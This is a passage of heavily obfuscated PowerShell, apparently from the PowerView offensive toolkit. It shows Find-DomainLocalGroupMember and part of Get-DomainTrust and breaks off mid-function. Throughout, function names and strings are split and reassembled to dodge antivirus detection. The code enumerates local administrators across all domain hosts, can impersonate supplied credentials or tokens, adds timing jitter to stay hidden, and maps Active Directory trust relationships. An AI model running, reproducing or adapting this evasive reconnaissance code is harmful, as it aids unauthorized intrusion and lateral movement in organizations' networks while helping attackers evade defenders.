        if (${pSBOunDpa`Ra`Me`TERs}[("{1}{3}{0}{2}{4}"-f 'ear','Compu','chBas','terS','e')]) { ${ComputErs`EA`RC`herAR`GUmENts}[("{0}{1}{2}"-f'SearchB','a','se')] = ${COMpu`Ter`SE`ARC`hBASE} }
        if (${psB`oUn`DPArA`MEtErS}[("{2}{3}{1}{0}" -f'ned','rai','Unco','nst')]) { ${c`omPut`erSEaRC`h`erarGUMents}[("{0}{3}{2}{1}" -f 'U','ed','nstrain','nco')] = ${U`Nc`oNStRaI`N`eD} }
        if (${p`S`B`oUNd`P`AramETErS}[("{0}{1}{3}{4}{2}" -f 'Comput','erOp','m','erati','ngSyste')]) { ${COM`P`U`TeR`Se`ArcheRaRgUm`eN`Ts}[("{0}{1}{4}{2}{3}" -f'Op','era','ingSy','stem','t')] = ${o`p`er`ATINgs`ySTem} }
        if (${pSBoUnd`p`ARAme`TERS}[("{4}{0}{2}{5}{1}{3}"-f 'put','rv','e','icePack','Com','rSe')]) { ${COmPu`T`erSe`ARCHeRARGu`menTs}[("{3}{1}{0}{2}"-f'rvice','e','Pack','S')] = ${S`erviCeP`A`CK} }
        if (${PsBO`UNDPaR`Ame`TErs}[("{2}{4}{1}{3}{0}{5}" -f't','mp','C','u','o','erSiteName')]) { ${COMPUTerS`e`ARc`He`RargUm`Ents}[("{0}{2}{1}"-f 'S','ame','iteN')] = ${s`ITEnAMe} }
        if (${pSb`ounDpArAmE`T`ErS}[("{0}{1}"-f'Se','rver')]) { ${cOMPutER`seArc`HER`Ar`GU`mENts}[("{1}{0}"-f'erver','S')] = ${sER`V`Er} }
        if (${ps`BOunDp`AR`AmeTErs}[("{3}{1}{0}{2}"-f'Sco','earch','pe','S')]) { ${co`mp`Uter`seARCh`ErarG`Um`En`Ts}[("{0}{2}{1}"-f 'Se','cope','archS')] = ${SEArChS`Co`pE} }
        if (${PS`Bo`UNDPAr`AME`TErs}[("{3}{2}{4}{0}{1}"-f'ge','Size','ltP','Resu','a')]) { ${C`OMP`UTEr`s`Ear`C`hERA`R`gUmENtS}[("{1}{2}{0}{3}{4}"-f 'S','R','esultPage','iz','e')] = ${r`eS`ULTpaGeSi`ze} }
        if (${psBOund`PaR`AmE`TerS}[("{3}{0}{1}{4}{2}"-f'rver','Tim','imit','Se','eL')]) { ${COmPU`T`E`Rs`EaR`c`HERarG`UMEnts}[("{2}{1}{0}" -f 'rTimeLimit','ve','Ser')] = ${SERV`e`RTIme`lim`IT} }
        if (${PsB`Oun`DP`AramET`e`RS}[("{0}{1}{2}" -f'Tombsto','n','e')]) { ${c`oMPuTE`RS`EA`RChER`ARG`UmEN`TS}[("{2}{1}{0}" -f 'one','bst','Tom')] = ${T`O`MbSTOne} }
        if (${pSb`OUnDp`AraM`ETeRs}[("{2}{0}{1}"-f 'r','edential','C')]) { ${c`OMPu`Te`RseaRCHERa`RG`UmENTs}[("{2}{1}{0}"-f'ial','nt','Crede')] = ${C`ReDe`NtiaL} }

        if (${pSBoundp`ARAm`e`T`e`Rs}[("{1}{0}{2}"-f 'a','ComputerN','me')]) {
            ${t`Ar`gE`T`cOmPUTErs} = ${c`om`P`UTErN`AmE}
        }
        else {
            &("{1}{0}{2}"-f't','Wri','e-Verbose') ("{6}{0}{7}{8}{3}{1}{4}{5}{9}{2}" -f 'F','r] Qu','e domain','lGroupMembe','ery','ing c','[','ind-Doma','inLoca','omputers in th')
            ${TArgeTC`oM`PuT`E`RS} = &("{0}{4}{3}{2}{1}" -f'Get-','ter','mpu','ainCo','Dom') @ComputerSearcherArguments | &("{1}{3}{2}{0}"-f 'ject','S','ect-Ob','el') -ExpandProperty ("{3}{0}{2}{1}"-f 'ns','stname','ho','d')
        }
        &("{2}{0}{1}"-f'ite-Verbo','se','Wr') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${t`A`RG`EtCOMPutE`RS}."l`eNGth" -eq 0) {
            throw ("{6}{1}{7}{4}{3}{2}{9}{5}{0}{8}"-f 'at','mainL','ember] No hosts foun','M','up','mer','[Find-Do','ocalGro','e','d to enu')
        }

        
        ${h`Ost`EnuM`BL`OCK} = {
            Param(${co`m`pu`TErNaMe}, ${GRo`UpN`AmE}, ${MET`h`oD}, ${t`okenha`Nd`LE})

            
            if (${gr`OUPn`AME} -eq ("{4}{3}{1}{2}{0}"-f's','mini','strator','d','A')) {
                ${ADmi`Nse`CUri`TYi`D`EnT`iFier} = &("{2}{0}{1}"-f 'Ob','ject','New-') ("{8}{4}{5}{3}{9}{6}{2}{1}{7}{0}"-f 'er','f','ti','rincipal','rit','y.P','Iden','i','System.Secu','.Security')( (  &("{1}{0}" -f'e','vAriABl') ("{1}{0}"-f'Hsv','0')  )."Va`lUe"::"b`UIL`T`INA`DmIni`sTRAtOR`SSId",${n`ULl})
                ${GrOUPN`A`me} = (${AdMI`NSEcUr`i`TyId`ENt`if`iEr}."TRANS`La`Te"([System.Security.Principal.NTAccount])."V`ALUE" -split "\\")[-1]
            }

            if (${To`KE`NHan`Dle}) {
                
                ${Nu`ll} = &("{3}{4}{0}{1}{2}" -f'ke-UserImpersona','tio','n','Inv','o') -TokenHandle ${TO`KE`NH`AnDlE} -Quiet
            }

            ForEach (${T`ARg`eTCO`MP`UTER} in ${c`omPu`Te`RNAme}) {
                ${uP} = &("{1}{3}{2}{0}"-f 'n','Test-Co','nectio','n') -Count 1 -Quiet -ComputerName ${tA`RG`EtCOmPUT`eR}
                if (${U`P}) {
                    ${NetlOCAlgROupMe`m`B`ERA`RgU`mEnTs} = @{
                        ("{0}{2}{1}{3}" -f'Compute','N','r','ame') = ${taRg`EtCO`mPUTeR}
                        ("{0}{1}" -f 'Me','thod') = ${m`EthoD}
                        ("{1}{0}{2}"-f'r','G','oupName') = ${G`RO`UpNAmE}
                    }
                    &("{1}{0}{2}{4}{3}{5}{6}" -f 'et','Get-N','L','alGroupM','oc','emb','er') @NetLocalGroupMemberArguments
                }
            }

            if (${TOK`en`hANd`lE}) {
                &("{0}{2}{1}{3}{4}" -f 'I','ke-RevertTo','nvo','Sel','f')
            }
        }

        ${L`Og`OnTok`eN} = ${n`Ull}
        if (${P`sb`ouNdp`AraM`EtERs}[("{1}{0}{2}{3}"-f 'r','C','edent','ial')]) {
            if (${psB`o`UnDp`Aram`Et`eRs}[("{0}{1}"-f 'Del','ay')] -or ${psBOuN`d`pa`Ram`Eters}[("{2}{4}{1}{0}{3}" -f 'Su','n','Stop','ccess','O')]) {
                ${L`OgonTOk`en} = &("{2}{1}{6}{5}{3}{4}{0}" -f 'onation','ok','Inv','pe','rs','m','e-UserI') -Credential ${crE`DEn`Tial}
            }
            else {
                ${lo`GonTOk`en} = &("{5}{4}{1}{2}{3}{6}{0}"-f 'ion','Imp','e','rson','ke-User','Invo','at') -Credential ${cre`D`E`NTIaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PsBO`UN`dpA`RAm`etERS}[("{0}{1}"-f'De','lay')] -or ${pS`BOundP`ARamET`eRS}[("{0}{1}{3}{2}" -f 'Stop','O','ess','nSucc')]) {

            &("{1}{2}{0}"-f 'e','Write-','Verbos') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{0}{1}{2}" -f'Write-V','e','rbose') ('[F'+'ind-Do'+'mainLocal'+'Grou'+'pMemb'+'e'+'r] '+'Del'+'ay'+': '+"$Delay, "+'Jitter'+':'+' '+"$Jitter")
            ${COU`NT`er} = 0
            ${RanD`NO} = &("{2}{1}{0}{3}" -f 'b','ew-O','N','ject') ("{1}{2}{0}" -f 'Random','System','.')

            ForEach (${ta`RgET`c`OmPuT`eR} in ${Ta`RGeT`co`mPut`Ers}) {
                ${c`OuN`TeR} = ${CO`UN`TEr} + 1

                
                &("{0}{1}{2}"-f 'S','tart-Sl','eep') -Seconds ${raN`D`No}.("{0}{1}" -f 'Ne','xt').Invoke((1-${jIT`Ter})*${D`El`Ay}, (1+${J`ItT`ER})*${de`lay})

                &("{1}{3}{2}{0}{4}" -f 's','Wr','rbo','ite-Ve','e') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{1}{3}{2}"-f 'I','nv','ommand','oke-C') -ScriptBlock ${Ho`sTeNU`MB`loCk} -ArgumentList ${ta`RGEtC`O`mpUT`er}, ${Gr`O`UpnAMe}, ${met`H`oD}, ${lo`GO`Nt`okEN}
            }
        }
        else {
            &("{3}{0}{1}{2}" -f '-','Verb','ose','Write') ('[Find'+'-D'+'o'+'m'+'ainLoca'+'lGro'+'u'+'pMe'+'m'+'ber] '+'Usi'+'ng '+'threa'+'di'+'ng '+'with'+' '+'thre'+'ads:'+' '+"$Threads")

            
            ${s`CrIp`TP`ARaMS} = @{
                ("{1}{2}{0}" -f'e','Gro','upNam') = ${Gro`UPn`A`Me}
                ("{0}{1}"-f'Me','thod') = ${meth`od}
                ("{2}{0}{1}{3}" -f 'o','ke','T','nHandle') = ${LO`gonT`OkEn}
            }

            
            &("{4}{1}{2}{3}{5}{0}"-f'tion','read','e','dF','New-Th','unc') -ComputerName ${tArGe`TCO`mPU`Te`RS} -ScriptBlock ${h`OsTe`NUM`BLO`CK} -ScriptParameters ${ScRIP`TPArA`ms} -Threads ${t`HReaDS}
        }
    }

    END {
        if (${LOg`ON`T`OKen}) {
            &("{2}{1}{0}{3}{4}" -f'tT','ever','Invoke-R','o','Self') -TokenHandle ${Lo`g`ONt`oKEn}
        }
    }
}








function gET`-Do`maiN`T`RuSt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}" -f 'PSShouldP','ces','s','ro'}, '')]
    [OutputType({"{5}{6}{4}{0}{3}{1}{2}" -f'T','t.','NET','rus','n','PowerView.Dom','ai'})]
    [OutputType({"{0}{2}{3}{4}{1}" -f 'PowerVie','Trust.LDAP','w','.Dom','ain'})]
    [OutputType({"{2}{1}{3}{5}{4}{0}{6}"-f'.A','owerVie','P','w.D','st','omainTru','PI'})]
    [CmdletBinding(DEFauLTPARAMeTeRSEtNAME = {"{0}{1}" -f 'LDA','P'})]
    Param(
        [Parameter(pOSItIon = 0, VaLueFRoMpipELiNe = ${t`Rue}, ValuEfROMpIpeLiNeByPRoperTynaME = ${T`Rue})]
        [Alias({"{0}{1}" -f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmAin},

        [Parameter(PARAMeteRsetNamE = 'API')]
        [Switch]
        ${a`Pi},

        [Parameter(paRaMETeRsEtnAme = 'NET')]
        [Switch]
        ${n`et},

        [Parameter(paraMETerSEtNAme = "l`dAp")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'r','Filte'})]
        [String]
        ${lDAp`Fi`LT`ER},

        [Parameter(ParAmetERSEtnAmE = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RO`Pert`IES},

        [Parameter(PARaMEtErsEtnAMe = "LD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'h','ADSPat'})]
        [String]
        ${sEa`RC`H`BASe},

        [Parameter(PARAMETersetName = "L`dAP")]
        [Parameter(paRAMEteRsEtNAme = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{4}{2}" -f'C','o','oller','Domain','ntr'})]
        [String]
        ${se`RVer},

        [Parameter(PaRAmeTeRsETnAmE = "l`DAp")]
        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}" -f'el','OneLev'}, {"{1}{2}{0}"-f 'btree','S','u'})]
        [String]
        ${SE`A`RCH`ScOPe} = ("{0}{2}{1}" -f'Subt','e','re'),

        [Parameter(parameteRsetNAME = "ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${r`es`UlTPa`gESIzE} = 200,

        [Parameter(pARAmETERsETName = "LD`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SeRVERTI`ME`lIM`IT},

        [Parameter(pArAMEtersEtNaME = "l`dAp")]
        [Switch]
        ${TOmbs`T`oNe},

        [Alias({"{0}{1}{2}" -f'Retu','r','nOne'})]
        [Switch]
        ${f`iNDo`Ne},

        [Parameter(PARaMetersEtnAme = "l`DAp")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`E`NTial} =  (  &('ls')  ("{3}{2}{0}{1}"-f ':5','R0vk','LE','vARiaB') )."v`ALUE"::"e`mPTy"
    )

    BEGIN {
        ${t`R`US`TATtR`iBu`TES} = @{
            [uint32]("{1}{2}{0}" -f'01','0x0','00000') = ("{2}{3}{0}{4}{1}"-f 'NS','VE','NON_T','RA','ITI')
            [uint32]("{2}{0}{1}" -f '00','2','0x00000') = ("{1}{0}{3}{2}"-f'PLEVEL_','U','LY','ON')
            [uint32]("{1}{0}{2}" -f'00000','0x','004') = ("{1}{0}{2}"-f 'ER_','FILT','SIDS')
            [uint32]("{2}{0}{1}" -f 'x00','000008','0') = ("{1}{0}{2}{3}" -f 'REST_T','FO','RANS','ITIVE')
            [uint32]("{2}{1}{0}"-f'000010','00','0x') = ("{3}{0}{1}{2}" -f 'ORGANIZAT','IO','N','CROSS_')
            [uint32]("{0}{2}{1}"-f'0','20','x000000') = ("{3}{2}{0}{1}"-f'N_FORES','T','THI','WI')
            [uint32]("{1}{0}{2}" -f 'x00000','0','040') = ("{1}{3}{2}{0}" -f 'ERNAL','T','EXT','REAT_AS_')
            [uint32]("{1}{0}{2}"-f 'x000000','0','80') = ("{0}{1}{4}{3}{2}"-f 'TRU','ST_USES_RC4_ENCRYP','N','O','TI')
            [uint32]("{2}{1}{0}"-f '0','000010','0x0') = ("{2}{0}{3}{1}{4}" -f 'U','T_USES_AES_K','TR','S','EYS')
            [uint32]("{3}{2}{0}{1}" -f'2','00','x00000','0') = ("{0}{5}{3}{6}{7}{4}{1}{2}{8}"-f'CR','N_NO_TG','T_DELEG','SS_ORGA','ATIO','O','N','IZ','ATION')
            [uint32]("{0}{2}{1}" -f '0x','000400','00') = ("{0}{2}{1}"-f'PI','_TRUST','M')
        }

        ${L`D`Ap`SeARCHeRARgumEn`TS} = @{}
        if (${PS`BOUN`dp`Ar`AmeTers}[("{2}{1}{0}" -f'n','omai','D')]) { ${lDAP`SE`ARCh`era`RG`UMEnTS}[("{1}{0}" -f'ain','Dom')] = ${d`OMa`iN} }
        if (${pSBo`UNdPa`Ra`M`etERS}[("{3}{2}{1}{0}"-f'ter','l','PFi','LDA')]) { ${ld`AP`seaRCHe`RAr`g`UmeNTS}[("{0}{2}{1}" -f 'LD','ilter','APF')] = ${l`dapFiL`Ter} }
        if (${psBoUN`dpA`RAM`eTe`Rs}[("{1}{3}{2}{0}"-f's','P','tie','roper')]) { ${LdaPseAR`c`h`ErARgu`MEnTS}[("{3}{1}{0}{2}"-f'r','e','ties','Prop')] = ${pROP`E`RtiES} }
        if (${pSbound`p`Aram`eteRs}[("{2}{0}{1}"-f 'Ba','se','Search')]) { ${L`dApSe`ARC`H`ErARg`UmEN`TS}[("{2}{1}{0}" -f'e','chBas','Sear')] = ${sEa`RcH`BASE} }
        if (${pSbo`U`NdPa`RaMe`Te`RS}[("{0}{1}" -f'Ser','ver')]) { ${LDAP`sea`RCheR`AR`gumenTs}[("{1}{0}"-f 'er','Serv')] = ${se`Rv`eR} }
        if (${pS`Bo`U`NDpara`Met`ers}[("{2}{0}{1}"-f'archS','cope','Se')]) { ${ldApSeA`Rch`er`A`RGuMents}[("{2}{1}{0}"-f'cope','rchS','Sea')] = ${sE`Arc`HSC`ope} }
        if (${P`SbOU`NdpA`Ra`MeTERS}[("{0}{1}{2}{3}{4}" -f'Res','ul','t','PageSiz','e')]) { ${L`D`ApseArc`heRArg`UMeNTs}[("{1}{2}{0}{3}" -f 'lt','R','esu','PageSize')] = ${rE`s`UlTpa`ge`sIZE} }
        if (${P`SBOUn`dpara`Me`TErS}[("{2}{0}{3}{1}"-f 'L','t','ServerTime','imi')]) { ${lDApse`AR`C`He`R`ARgUme`NtS}[("{3}{2}{4}{1}{0}" -f 'mit','meLi','rT','Serve','i')] = ${seR`VerTIm`e`L`imIt} }
        if (${psbOund`Par`A`M`ETeRS}[("{2}{1}{0}" -f'bstone','m','To')]) { ${ld`A`pseA`RChE`Ra`RGumEn`TS}[("{2}{0}{1}" -f 'to','ne','Tombs')] = ${t`OMB`stOne} }
        if (${pS`BoUN`D`PAramETE`RS}[("{2}{0}{1}" -f'edenti','al','Cr')]) { ${LdAPSEarch`ERa`RgU`M`EN`TS}[("{3}{0}{1}{2}" -f 't','ia','l','Creden')] = ${cRE`den`TIAL} }
    }

    PROCESS {
        if (${PScM`DL`ET}.PARAMeTerSeTnAmE -ne 'API') {
            ${NE`T`se`Arche`R`A`RGUMENTs} = @{}
            if (${DO`mAin} -and ${d`OMAIN}.("{0}{1}" -f 'T','rim').Invoke() -ne '') {
                ${S`OURcEDom`A`iN} = ${D`OmA`iN}
            }
            else {
                if (${p`sBOUNdPA`R`AmEte`Rs}[("{1}{2}{3}{0}"-f 'ntial','Cr','ed','e')]) {
                    ${sour`CeDom`AIn} = (&("{3}{2}{0}{1}" -f '-Domai','n','et','G') -Credential ${cReDE`Nti`Al})."Na`mE"
                }
                else {
                    ${SO`URc`Ed`OMAiN} = (&("{1}{0}{2}"-f'Do','Get-','main'))."na`ME"
                }
            }
        }
        elseif (${PScm`d`Let}.PaRAmEtErSetnamE -ne 'NET') {
            if (${d`omaIn} -and ${dOmA`iN}.("{1}{0}"-f'm','Tri').Invoke() -ne '') {
                ${sOuRc`ed`Om`AIN} = ${D`OM`AIn}
            }
            else {
                ${S`OURCe`do`mAIn} = ${ENV`:`USER`dn`SdOmA`iN}
            }
        }

        if (${P`SCmd`lEt}.PaRAMETERSetnaME -eq ("{1}{0}" -f'P','LDA')) {
            
            ${TR`U`stSearCher} = &("{2}{0}{3}{1}" -f 'et-DomainSe','cher','G','ar') @LdapSearcherArguments
            ${s`o`URcESiD} = &("{2}{1}{0}{3}" -f'i','Doma','Get-','nSID') @NetSearcherArguments

            if (${tR`UStsEARc`H`Er}) {

                ${T`RusTseArCH`ER}."FIl`TeR" = ("{3}{1}{4}{0}{6}{2}{5}"-f's','bjectClass=t','ed','(o','ru','Domain)','t')

                if (${ps`Bo`UNDParame`T`erS}[("{1}{0}"-f'ne','FindO')]) { ${re`sulTS} = ${Tr`UsTseA`RC`hER}.("{1}{0}"-f 'e','FindOn').Invoke() }
                else { ${rES`Ul`TS} = ${Tr`USTsE`Ar`Ch`er}.("{2}{0}{1}" -f 'nd','All','Fi').Invoke() }
                ${R`ES`UltS} | &("{0}{3}{2}{1}"-f'Where','bject','O','-') {${_}} | &("{3}{2}{0}{4}{1}"-f 'b','ect','rEach-O','Fo','j') {
                    ${Pr`opS} = ${_}."pR`O`peRTiES"
                    ${d`oma`In`TRUsT} = &("{0}{2}{1}" -f 'N','ject','ew-Ob') ("{0}{1}{2}" -f 'PS','Ob','ject')

                    ${t`RUsTAtTr`Ib} = @()
                    ${TR`U`sTATTR`ib} += ${TruSTAtt`R`iBuT`es}."ke`ys" | &("{0}{1}{2}" -f'Where-','Ob','ject') { ${PrO`Ps}."trU`sT`AtTRib`U`TeS"[0] -band ${_} } | &("{0}{3}{2}{1}" -f 'F','ch-Object','rEa','o') { ${tR`UsTattrIbu`T`eS}[${_}] }

                    ${Di`RECti`oN} = Switch (${p`R`OpS}."T`Rustd`Ire`CtiON") {
                        0 { ("{2}{1}{0}" -f'bled','isa','D') }
                        1 { ("{1}{0}" -f 'bound','In') }
                        2 { ("{0}{1}{2}" -f'Ou','tb','ound') }
                        3 { ("{1}{2}{0}"-f 'l','Bid','irectiona') }
                    }

                    ${TRust`T`ype} = Switch (${PR`OPs}."TRuS`TT`ype") {
                        1 { ("{5}{2}{1}{0}{3}{4}{6}"-f'S_N','OW','ND','ON_A','CTI','WI','VE_DIRECTORY') }
                        2 { ("{0}{6}{5}{3}{1}{2}{4}" -f 'WIN','VE_DI','RE','CTI','CTORY','OWS_A','D') }
                        3 { 'MIT' }
                    }

                    ${D`is`TIngUiShEDNA`mE} = ${P`ROPS}."DistiNg`UI`Sh`E`DnaME"[0]
                    ${sO`Ur`C`eNAMeInDEx} = ${dIS`Ti`NgUiSHeD`Name}.("{0}{1}" -f 'In','dexOf').Invoke('DC=')
                    if (${Sou`Rc`En`AM`EInDEx}) {
                        ${Sour`c`edo`maIn} = $(${dISt`inGuIS`hEd`NA`ME}.("{2}{1}{0}"-f 'g','Strin','Sub').Invoke(${souR`c`En`AMEiNdex})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${sOu`R`CeDOM`AIn} = ""
                    }

                    ${tAr`g`eTNa`MEIndEx} = ${d`istI`NGu`iShE`dnamE}.("{1}{0}"-f'dexOf','In').Invoke(("{2}{0}{1}" -f 'N','=System',',C'))
                    if (${SOU`Rc`eNA`MEi`NdEx}) {
                        ${t`ARg`et`DoMAIN} = ${D`istinGUish`edn`AmE}.("{1}{2}{0}" -f'ing','S','ubStr').Invoke(3, ${t`ARGe`TNAMeI`NdEx}-3)
                    }
                    else {
                        ${TargEt`D`omAiN} = ""
                    }

                    ${OB`J`EctgUid} = &("{0}{2}{3}{1}" -f'New','ject','-O','b') ("{1}{0}"-f 'd','Gui') @(,${P`Rops}."OB`jeCtG`UiD"[0])
                    ${T`ARG`EtsId} = (&("{2}{0}{1}"-f 'e','ct','New-Obj') ("{4}{10}{0}{11}{5}{7}{6}{9}{3}{2}{8}{1}" -f'.Secu','dentifier','ecu','al.S','Sys','Pr','n','i','rityI','cip','tem','rity.')(${pr`OPs}."s`ECURiTyi`dEn`T`if`iER"[0],0))."va`LUe"

                    ${do`MaInT`RU`ST} | &("{2}{1}{0}"-f 'mber','d-Me','Ad') ("{1}{0}{2}"-f'er','Noteprop','ty') ("{1}{2}{0}"-f'rceName','S','ou') ${sour`CedO`Ma`IN}
                    ${D`oMA`INTRU`sT} | &("{0}{1}{2}" -f'A','dd-','Member') ("{1}{3}{0}{2}"-f'opert','Notep','y','r') ("{1}{0}{2}"-f 'rgetNa','Ta','me') ${pRo`PS}."n`AMe"[0]
                    
                    ${DomainT`R`Ust} | &("{2}{0}{1}" -f 'Mem','ber','Add-') ("{2}{3}{1}{0}"-f 'rty','e','N','oteprop') ("{1}{0}{2}"-f 'rustT','T','ype') ${T`RUS`TType}
                    ${dOma`i`NtruST} | &("{3}{1}{2}{0}"-f'ber','dd','-Mem','A') ("{0}{1}{3}{2}"-f 'Not','ep','erty','rop') ("{3}{1}{0}{2}"-f'ttribu','tA','tes','Trus') $(${t`Rustattr`ib} -join ',')
                    ${D`o`MainTrUST} | &("{1}{0}{2}" -f 'dd-M','A','ember') ("{1}{2}{0}"-f 'rty','Note','prope') ("{1}{2}{0}{4}{3}"-f 'ir','Tru','stD','ion','ect') "$Direction"
                    ${d`OmaiNtr`Ust} | &("{2}{0}{1}"-f'm','ber','Add-Me') ("{0}{1}{2}" -f'N','oteproper','ty') ("{0}{1}{2}{3}"-f 'Wh','enC','re','ated') ${Pr`Ops}."W`heNc`Re`ATEd"[0]
                    ${DO`MaINt`R`UsT} | &("{1}{2}{0}" -f'-Member','A','dd') ("{0}{1}{2}{3}"-f 'No','teproper','t','y') ("{1}{0}{3}{2}"-f'en','Wh','nged','Cha') ${p`R`Ops}."W`hE`NchangEd"[0]
                    ${dO`M`AI`NtRust}."PS`ObJeCT"."ty`p`ENAmes".("{1}{0}" -f'rt','Inse').Invoke(0, ("{2}{0}{5}{1}{3}{4}" -f'iew.Do','nTrust','PowerV','.','LDAP','mai'))
                    ${D`OMAiNTr`UsT}
                }
                if (${r`EsU`LTS}) {
                    try { ${re`sUlts}.("{0}{1}" -f 'disp','ose').Invoke() }
                    catch {
                        &("{0}{2}{1}"-f 'Wri','-Verbose','te') ('[G'+'et'+'-D'+'omainT'+'rust] '+'Er'+'ror '+'di'+'sposi'+'ng'+' '+'o'+'f '+'th'+'e '+'Re'+'sults'+' '+'o'+'bje'+'ct: '+"$_")
                    }
                }
                ${t`R`UST`SeARcHeR}.("{1}{0}"-f'se','dispo').Invoke()
            }
        }
        elseif (${P`SCM`DlEt}.paRaMetErSeTNAME -eq 'API') {
            
            if (${ps`Bo`UNdp`ARAMeTers}[("{2}{0}{1}"-f'er','ver','S')]) {
                ${TaR`g`EtDc} = ${se`R`VEr}
            }
            elseif (${D`O`maIn} -and ${D`oMaIN}.("{0}{1}" -f'T','rim').Invoke() -ne '') {
                ${targe`T`dc} = ${do`m`AiN}
            }
            else {
                
                ${T`ArgEt`DC} = ${N`ULl}
            }

            
            ${Ptr`I`NFo} =   (&('LS') ("{0}{2}{1}{3}" -f 'VArIabL','oY','E:','9') )."vAl`Ue"::"zE`RO"

            
            ${fL`A`Gs} = 63
            ${D`OM`AInCO`UnT} = 0

            
            ${R`eS`UlT} = ${NEt`API`32}::"ds`enUm`EraTeDoM`A`iNT`R`USTs"(${tar`ge`TDc}, ${fLA`GS}, [ref]${Pt`RI`NFO}, [ref]${do`MAI`N`COuNt})

            
            ${Off`sET} = ${Ptr`IN`Fo}.("{1}{0}{2}"-f'oI','T','nt64').Invoke()

            
            if ((${r`esU`Lt} -eq 0) -and (${Off`s`Et} -gt 0)) {

                
                ${Inc`R`emenT} = ${Ds_Dom`Ain_T`RuS`TS}::("{1}{0}"-f 'e','GetSiz').Invoke()

                
                for (${I} = 0; (${i} -lt ${doM`AI`NC`ount}); ${i}++) {
                    
                    ${NEW`int`ptR} = &("{0}{3}{1}{2}" -f'N','O','bject','ew-') ("{3}{1}{2}{4}{0}" -f 'r','.In','t','System','pt') -ArgumentList ${oFFs`Et}
                    ${IN`Fo} = ${N`EWInTP`TR} -as ${DS_d`omaiN_tr`U`sTS}

                    ${ofFS`eT} = ${N`EW`I`NTpTr}.("{0}{1}"-f 'ToI','nt64').Invoke()
                    ${OFfs`ET} += ${i`N`cRem`eNt}

                    ${S`iDsTrI`NG} = ''
                    ${res`U`LT} = ${aDvAPi`32}::"c`onvERTs`iDtOStRi`NGS`Id"(${i`NFo}."d`OmA`iNsiD", [ref]${sId`str`ING});${l`ASTEr`R`OR} =   (  &("{1}{0}" -f'RIABle','VA')  ("F1"+"8t")  -va )::("{0}{1}{5}{2}{4}{3}" -f 'Ge','t','astWi','ror','n32Er','L').Invoke()

                    if (${R`e`SulT} -eq 0) {
                        &("{1}{0}{2}"-f 'rite-V','W','erbose') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${d`O`M`AINTrusT} = &("{3}{2}{0}{1}" -f 'w-','Object','e','N') ("{1}{0}"-f'bject','PSO')
                        ${D`oMa`i`NTRuSt} | &("{2}{1}{0}" -f 'ber','d-Mem','Ad') ("{2}{3}{1}{0}" -f 'ty','eproper','N','ot') ("{1}{2}{0}" -f 'me','Sour','ceNa') ${S`ou`R`CedOm`AiN}
                        ${DoMAin`T`RUSt} | &("{2}{1}{0}"-f 'ember','dd-M','A') ("{2}{0}{3}{1}"-f'te','erty','No','prop') ("{1}{2}{0}"-f'etName','Ta','rg') ${I`NfO}."DnSdo`MA`Inn`AME"
                        ${DO`MAIntr`U`sT} | &("{2}{0}{1}"-f 'dd-M','ember','A') ("{3}{1}{0}{2}"-f'ope','tepr','rty','No') ("{1}{0}{3}{2}"-f'tNe','Targe','ame','tbiosN') ${i`NFO}."neTB`I`Osd`oMaINNA`Me"
                        ${DOm`AIn`T`RUST} | &("{2}{0}{1}" -f 'mb','er','Add-Me') ("{1}{3}{2}{0}"-f 'property','No','e','t') ("{1}{0}"-f 'lags','F') ${iN`FO}."FLa`gs"
                        ${D`OmAInT`RUst} | &("{2}{3}{1}{0}" -f'ber','em','A','dd-M') ("{0}{2}{1}"-f 'Notepr','erty','op') ("{1}{2}{0}" -f 'ex','Pa','rentInd') ${I`Nfo}."PARE`N`TinDEx"
                        ${d`omaiNTR`UST} | &("{1}{2}{0}" -f'ember','A','dd-M') ("{1}{3}{0}{2}"-f'p','Notep','erty','ro') ("{0}{2}{1}"-f'Trust','e','Typ') ${i`NFO}."T`Ru`sttYpe"
                        ${dO`maint`RU`St} | &("{1}{0}{2}" -f 'd-Memb','Ad','er') ("{0}{1}{2}" -f 'No','tepr','operty') ("{1}{2}{0}"-f'utes','TrustAtt','rib') ${I`NFO}."T`R`Ust`ATTRibUtes"
                        ${doMA`I`NT`RusT} | &("{1}{2}{0}" -f 'r','Add','-Membe') ("{2}{1}{3}{0}" -f'y','epr','Not','opert') ("{0}{1}" -f'Target','Sid') ${S`I`DS`TrING}
                        ${Do`mAinTrU`St} | &("{2}{0}{1}"-f'-','Member','Add') ("{2}{3}{0}{1}"-f 'eprope','rty','No','t') ("{0}{2}{3}{1}"-f'T','id','ar','getGu') ${iN`FO}."dOmA`i`NGu`Id"
                        ${DOm`AIntR`U`sT}."psoB`JE`ct"."tYPe`Na`mEs".("{1}{2}{0}"-f'ert','In','s').Invoke(0, ("{4}{3}{1}{0}{2}" -f 'mainT','Do','rust.API','iew.','PowerV'))
                        ${DOMaiN`T`Ru`st}
                    }
                }
                
                ${nU`ll} = ${N`eTa`P`I32}::("{3}{1}{0}{2}" -f 'piBuf','tA','ferFree','Ne').Invoke(${pTR`i`Nfo})
            }
            else {
                &("{4}{3}{0}{1}{2}"-f'Ver','bos','e','ite-','Wr') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${fOUNd`dO`main} = &("{1}{2}{0}" -f 'in','Get-','Doma') @NetSearcherArguments
            if (${F`ouNDd`oMain}) {
